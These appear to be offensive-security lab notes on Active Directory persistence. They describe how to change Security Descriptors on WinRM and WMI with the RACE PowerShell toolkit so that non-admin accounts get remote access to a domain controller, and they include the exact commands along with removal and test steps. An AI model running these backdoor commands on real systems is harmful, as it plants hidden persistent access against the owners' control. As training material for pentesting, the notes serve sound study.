It's possible to modify Security Descriptors (security information like
Owner, primary group, DACL and SACL) of multiple remote access
methods (securable objects) to allow access to non-admin users.

Administrative privileges are required for this, however it is a very impactful backdoor mechanism

> [!NOTE] **NOTE**
> Security Descriptor Definition Language Format:
> `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`
> 
> ACE for built-in administrators for WMI namespaces:
> `A;CI;CCDCLCSWRPWPRCWD;;;SID`
> 
> We're interested in simply changing the SID to a user we control

### RACE
ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:

```powershell
. .\RACE-master\Race.ps1
```
##### WinRM
On a local machine
```powershell
Set-RemotePSRemoting -SamAccountName student1 -Verbose
```

On a remote machine for user `student548` **without** explicit credentials
```powershell
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
```

##### WMI
On a local machine
```powershell
Set-RemoteWMI -SamAccountName student1 -Verbose
```

On a remote machine for user `student548` **without** explicit credentials
```powershell
Set-RemoteWMI -SamAccountName student548 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

Removing permissions
```powershell
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
```

Test with `gwmi`
```powershell
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```